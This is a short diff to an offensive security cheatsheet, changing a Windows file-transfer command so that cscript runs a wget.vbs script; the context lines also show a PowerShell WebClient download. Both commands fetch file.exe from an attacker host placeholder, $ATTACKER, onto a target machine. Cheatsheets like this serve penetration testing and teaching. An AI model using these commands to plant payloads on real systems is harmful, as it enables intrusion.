@@ -231,7 +231,7 @@ powershell (New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/file
 ##### HTTP: VBScript
 Copy and paste contents of [wget-cscript](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/wget-cscript) into a Windows Shell and then:
 ```
-cscript wget-cscript http://$ATTACKER/file.exe localfile.exe
+cscript wget.vbs http://$ATTACKER/file.exe localfile.exe
 ```
 
 ##### HTTP: Linux
